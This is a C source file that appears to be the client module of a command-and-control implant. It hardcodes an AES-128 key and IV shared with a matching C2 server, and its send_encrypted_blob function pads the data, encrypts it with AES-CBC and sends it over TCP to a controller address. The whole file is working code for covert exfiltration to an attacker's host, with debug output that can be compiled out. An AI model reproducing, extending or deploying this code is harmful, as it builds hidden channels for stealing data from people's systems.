#include "C2.h"
#include "aes.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

// === CONFIGURATION ===
// Hardcoded AES key and IV (must match C2Server.c)
// Using AES-128-CBC mode (16-byte key, 16-byte IV)
static const uint8_t aes_key[16] = {
    0x13, 0x37, 0xBA, 0xD0, 0xC0, 0xFF, 0xEE, 0x12,
    0x42, 0x24, 0x81, 0x19, 0x99, 0x88, 0x77, 0x66
};

static const uint8_t aes_iv[16] = {
    0x10, 0x32, 0x54, 0x76, 0x98, 0xBA, 0xDC, 0xFE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF
};

// Pad the length up to a multiple of AES block size (16 bytes)
// Required by AES CBC mode
static size_t pad_to_block(size_t len) {
    return (len % AES_BLOCKLEN == 0) ? len : len + (AES_BLOCKLEN - (len % AES_BLOCKLEN));
}

// === MAIN FUNCTION: send_encrypted_blob ===
// Encrypts with AES-CBC, and sends over TCP
int send_encrypted_blob(const uint8_t *data, size_t length) {
#ifdef DEBUG
    fprintf(stderr, "[DEBUG] Preparing to send %zu bytes\n", length);
#endif

    // Compute PKCS#7 padding size
    uint8_t pad = AES_BLOCKLEN - (length % AES_BLOCKLEN);
    size_t padded_len = length + pad;

    uint8_t *buffer = malloc(padded_len);
    if (!buffer) {
#ifdef DEBUG
        perror("[DEBUG] Memory allocation failed");
#endif
        return 0;
    }

    memcpy(buffer, data, length);
    memset(buffer + length, pad, pad); // Proper PKCS#7 padding

#ifdef DEBUG
    fprintf(stderr, "[DEBUG] Padded length: %zu bytes (pad: %u)\n", padded_len, pad);
#endif

    // Encrypt the buffer in-place
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_encrypt_buffer(&ctx, buffer, padded_len);
#ifdef DEBUG
    fprintf(stderr, "[DEBUG] AES encryption complete\n");
#endif

    // Setup socket and connect to server
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
#ifdef DEBUG
        perror("[DEBUG] socket()");
#endif
        free(buffer);
        return 0;
    }

    struct sockaddr_in server = {0};
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server.sin_addr);

    if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
#ifdef DEBUG
        perror("[DEBUG] connect()");
#endif
        close(sockfd);
        free(buffer);
        return 0;
    }
#ifdef DEBUG
    fprintf(stderr, "[DEBUG] Connected to %s:%d\n", C2_IP, C2_PORT);
#endif

    // Send the encrypted payload
    ssize_t sent = send(sockfd, buffer, padded_len, 0);
    if (sent != (ssize_t)padded_len) {
#ifdef DEBUG
        fprintf(stderr, "[DEBUG] send() incomplete: %ld of %zu bytes sent\n", sent, padded_len);
#endif
        close(sockfd);
        free(buffer);
        return 0;
    }
#ifdef DEBUG
    fprintf(stderr, "[DEBUG] Encrypted data sent successfully\n");
#endif

    close(sockfd);
    free(buffer);
    return 1;
}

